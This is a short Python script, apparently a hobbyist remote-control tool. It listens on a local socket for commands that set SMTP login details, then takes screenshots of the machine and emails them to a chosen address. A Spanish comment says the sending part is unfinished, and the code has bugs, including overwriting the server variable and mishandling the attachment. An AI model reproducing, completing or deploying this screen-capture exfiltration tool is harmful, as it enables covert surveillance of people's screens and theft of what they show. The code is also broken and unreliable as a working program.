#-*-coding: utf-8-*-
from pyautogui import screenshot
from socket import *
from smtplib import SMTP
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from os import path

if __name__ == '__main__':
	sock = socket(AF_INET, SOCK_STREAM)
	sock.bind(("127.0.0.1", 5000))
	sock.listen(1)
	conn, addr = sock.accept()
	password, user, urmail, server= str(), str(), str(), str()

	while True:
		cmd = conn.recv(1024).decode()
		if cmd[:4] == "logp":
			password = cmd[5:]
		elif cmd == "show options":
			conn.send("User: {}\nPassword: {}\nSend to: {}\nSMTP server: {}".format(user,password,urmail, server).encode())
		elif cmd[:6] == "sendto":
			urmail = cmd[7:]
		elif cmd[:4] == "logu":
			user = cmd[5:]
		elif cmd[:6] == "server":
			server = cmd[7:]
		elif cmd[:4] == "take":
			try:
				#Aun no sirve lo de mandar la foto, sigue en progreso.
				ss = screenshot()
				ss.save(cmd[5:])
				server = SMTP(server)
				server.starttls()
				server.login(user, password)
				ad = MIMEBase('application', 'octet-stream')
				ad.set_payload(open(cmd[5:], "rb").read())
				ad = encode_base64(ad)
				server.sendmail(user, urmail, str(ad))		
			except Exception as e:
				conn.send("{}".format(e).encode())



